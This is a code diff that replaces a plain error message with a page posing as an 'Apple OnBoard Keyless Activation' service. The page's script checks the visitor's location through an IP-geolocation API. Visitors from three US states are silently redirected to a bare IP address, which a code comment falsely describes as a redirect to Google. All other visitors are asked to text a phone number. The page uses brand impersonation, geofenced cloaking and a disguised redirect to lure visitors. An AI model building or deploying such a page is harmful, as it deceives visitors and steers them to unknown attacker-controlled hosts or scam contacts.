@@ -1,1 +1,78 @@
-<p>An error occoured. Try again later</p>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Apple OnBoard Keyless Activation</title>
+<style>
+    body {
+        font-family: 'Arial', sans-serif;
+        background-color: #f0f0f0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+    }
+    
+    .container {
+        text-align: center;
+    }
+
+    .loading-message {
+        font-size: 24px;
+        color: #333;
+        margin-bottom: 20px;
+    }
+
+    .error-message {
+        font-size: 24px;
+        color: #ff0000;
+        margin-bottom: 20px;
+    }
+</style>
+</head>
+<body>
+    <div class="container" id="content">
+        <script>
+            function getLocation() {
+                // Display loading message
+                document.getElementById('content').innerHTML = `
+                    <div class="loading-message">
+                        Using Apple WEBKIT to attempt a keyless activation, please wait...
+                    </div>
+                `;
+
+                // Fetch IP geolocation data
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        const { region_code } = data;
+                        const allowedStates = ['OR', 'IA', 'WA'];
+
+                        if (allowedStates.includes(region_code)) {
+                            window.location.href = 'http://50.39.146.160:80'; // Redirect to Google
+                        } else {
+                            document.getElementById('content').innerHTML = `
+                                <div class="error-message">
+                                    Apple OnBoard keyless activation has failed.<br>
+                                    Please text 9718088801 to gain access, or please navigate to your home.
+                                </div>
+                            `;
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP geolocation:', error);
+                        document.getElementById('content').innerHTML = `
+                            <div class="error-message">
+                                Error: Unable to determine location.
+                            </div>
+                        `;
+                    });
+            }
+
+            getLocation();
+        </script>
+    </div>
+</body>
+</html>
